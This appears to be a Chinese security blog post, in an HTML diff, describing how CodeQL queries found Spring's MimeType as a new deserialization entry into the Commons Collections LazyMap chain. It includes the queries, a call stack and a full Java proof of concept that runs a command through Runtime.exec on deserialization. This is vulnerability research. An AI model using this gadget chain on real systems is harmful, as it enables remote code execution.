@@ -1,0 +1,123 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="15e8418c75048e1c40f572e77f3a6149">前言</h1>
+<p>使用CodeQL在Spring组件里找到新的入口类MimeType，能够触发到LazyMap#get，进而触发CC链<br/>
+简单记录了一下使用codeql挖链子的工作流程，本机环境和依赖：</p>
+<ul>
+<li>jdk 17.0.11</li>
+<li>SpringBoot 3.1.10</li>
+<li>CC 3.2.1</li>
+<li>codeql cli 2.17.0</li>
+</ul>
+<p>PS：被<a href="https://github.com/yezere" target="_blank">@n1ght</a>狠狠拷打了几天，让我赶紧分析链子，在做了在做了（进度%0）<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240419210205-059abd34-fe4d-1.png"/></p>
+<h1 data-content="1" id="2dc48be42e95a7f4357fa748c83d8079">CodeQL起手式</h1>
+<p>官方文档推荐使用vscode extension来搭建CodeQL环境，简单来说就是下面三个步骤：</p>
+<ul>
+<li>下载CodeQL CLI命令行工具，配置好终端环境变量</li>
+<li>vscode安装CodeQL插件，配置好CodeQL CLI的路径</li>
+<li>下载vscode-codeql-starter工作空间</li>
+</ul>
+<p>搭好框架，下一步是导入数据库，随便找一个项目java-sec-code，创建数据库命令的命令：</p>
+<div class="highlight"><pre><span></span>codeql database create /Users/jasper/Documents/Security/tools/CodeQL/databases/java-sec-code-database --language<span class="o">=</span>java --source-root<span class="o">=</span>/Users/jasper/Documents/Security/java/java-sec-code --command<span class="o">=</span><span class="s2">"mvn clean package"</span>
+</pre></div>
+<p>点侧栏点CodeQL插件，选Java、导入数据库、运行example.ql，能正常运行输出结果，说明环境正常，开挖<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240419210252-217dc0be-fe4d-1.png"/></p>
+<h1 data-content="1" id="7ad65db3db9d6a64495268a0a85b1ab7">编写查询</h1>
+<p>CodeQL基础语法网上很多文章，基本是对着文档翻译的，可以直接从<a href="https://codeql.github.com/docs/writing-codeql-queries/" target="_blank">写查询语句</a>开始往下看，不多赘述<br/>
+下面写一下找链子的流程，首先分析目标：找一个新的入口类，经过调用，能够触发到LazyMap#get<br/>
+那么显然source就是readObject方法，在类中定义成员谓词写限定条件</p>
+<div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">ReadObjectMethod</span> <span class="kd">extends</span> <span class="n">Method</span> <span class="o">{</span>
+    <span class="n">ReadObjectMethod</span><span class="o">(){</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">getDeclaringType</span><span class="o">()</span> <span class="k">instanceof</span> <span class="n">Serializable</span> <span class="n">and</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">isPrivate</span><span class="o">()</span> <span class="n">and</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">hasName</span><span class="o">(</span><span class="s">"readObject"</span><span class="o">)</span> <span class="n">and</span> 
+        <span class="k">this</span><span class="o">.</span><span class="na">getReturnType</span><span class="o">()</span> <span class="k">instanceof</span> <span class="n">VoidType</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p>然后再写sink点的限定条件，直接指定LazyMap全类名的get方法即可</p>
+<div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">LazyMapGetMethod</span> <span class="kd">extends</span> <span class="n">Method</span> <span class="o">{</span>
+    <span class="n">LazyMapGetMethod</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">getDeclaringType</span><span class="o">()</span> <span class="k">instanceof</span> <span class="n">Serializable</span> <span class="n">and</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">isPublic</span><span class="o">()</span> <span class="n">and</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">getReturnType</span><span class="o">()</span> <span class="k">instanceof</span> <span class="n">TypeObject</span> <span class="n">and</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">hasName</span><span class="o">(</span><span class="s">"get"</span><span class="o">)</span> <span class="n">and</span> 
+        <span class="k">this</span><span class="o">.</span><span class="na">getDeclaringType</span><span class="o">().</span><span class="na">hasQualifiedName</span><span class="o">(</span><span class="s">"org.apache.commons.collections.map"</span><span class="o">,</span><span class="s">"LazyMap"</span><span class="o">)</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p>运行一下有45条结果，可以看到光MimeType就有几条路径可以调到LazyMap#get，随便找一条验证一下即可<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240419210317-3068aa3a-fe4d-1.png"/><br/>
+实际上，直接把sink点定到transform也可以找到这条链子，它是可以直接打到ChainedTransformer#transfrom的<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240419210340-3e140dc8-fe4d-1.png"/></p>
+<h1 data-content="1" id="e51ac2e433d8046c1074b5e93482bff6">链子分析和验证</h1>
+<p>以找到的最简单的路径为例，通过MimeType入口类触发getParameter到LazyMap#get，调用链如下：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240419210347-42adbe7e-fe4d-1.png"/><br/>
+然后拼上CC1-LazyMap后半段，验证链子是否有效，函数调用栈如下：</p>
+<pre><code>transform:120, InvokerTransformer (org.apache.commons.collections.functors)
+transform:123, ChainedTransformer (org.apache.commons.collections.functors)
+get:158, LazyMap (org.apache.commons.collections.map)
+getParameter:328, MimeType (org.springframework.util)
+readObject:677, MimeType (org.springframework.util)
+invoke0:-1, NativeMethodAccessorImpl (jdk.internal.reflect)
+invoke:77, NativeMethodAccessorImpl (jdk.internal.reflect)
+invoke:43, DelegatingMethodAccessorImpl (jdk.internal.reflect)
+invoke:568, Method (java.lang.reflect)
+invokeReadObject:1104, ObjectStreamClass (java.io)
+readSerialData:2434, ObjectInputStream (java.io)
+readOrdinaryObject:2268, ObjectInputStream (java.io)
+readObject0:1744, ObjectInputStream (java.io)
+readObject:514, ObjectInputStream (java.io)
+readObject:472, ObjectInputStream (java.io)
+unserializeBase64:38, SerializeUtils (utils)
+main:34, Test (Test)</code></pre>
+<p>MimeType#readObject会调用this.getParameter("charset")<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240419210406-4dc6bb44-fe4d-1.png"/><br/>
+getParameter会调用this.parameters.get("chatset")<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240419210414-529d8ef4-fe4d-1.png"/><br/>
+parameters正好是Map类型的，我们用反射把变量设置成LazyMap对象即可<br/>
+需要注意的是，jdk17中反射修改变量会存在权限问题，所以这里使用unsafe修改parameters变量<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240419210426-59cc81bc-fe4d-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240419210432-5cf28670-fe4d-1.png"/><br/>
+Poc如下：</p>
+<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">Test</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.util.MimeType</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">sun.misc.Unsafe</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.*</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">utils.*</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+
+        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
+                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"open -a Calculator"</span><span class="o">})</span>
+        <span class="o">};</span>
+        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+        <span class="n">HashMap</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+        <span class="n">Map</span> <span class="n">map1</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span> <span class="n">chainedTransformer</span><span class="o">);</span>
+
+        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">Unsafe</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"theUnsafe"</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">Unsafe</span> <span class="n">unsafe</span> <span class="o">=</span> <span class="o">(</span><span class="n">Unsafe</span><span class="o">)</span><span class="n">field</span><span class="o">.</span><span class="na">get</span><span class="o">((</span><span class="n">Object</span><span class="o">)</span><span class="kc">null</span><span class="o">);</span>
+        <span class="n">MimeType</span> <span class="n">mimeType</span> <span class="o">=</span> <span class="o">(</span><span class="n">MimeType</span><span class="o">)</span> <span class="n">unsafe</span><span class="o">.</span><span class="na">allocateInstance</span><span class="o">(</span><span class="n">MimeType</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">unsafe</span><span class="o">.</span><span class="na">putObject</span><span class="o">(</span><span class="n">mimeType</span><span class="o">,</span><span class="n">unsafe</span><span class="o">.</span><span class="na">objectFieldOffset</span><span class="o">(</span><span class="n">MimeType</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"parameters"</span><span class="o">)),</span><span class="n">map1</span><span class="o">);</span>
+
+        <span class="n">String</span> <span class="n">pld</span> <span class="o">=</span>  <span class="n">SerializeUtils</span><span class="o">.</span><span class="na">serializeBase64</span><span class="o">(</span><span class="n">mimeType</span><span class="o">);</span>
+        <span class="n">SerializeUtils</span><span class="o">.</span><span class="na">unserializeBase64</span><span class="o">(</span><span class="n">pld</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240419210443-63d58302-fe4d-1.png"/></p>
+</div>
+</div>
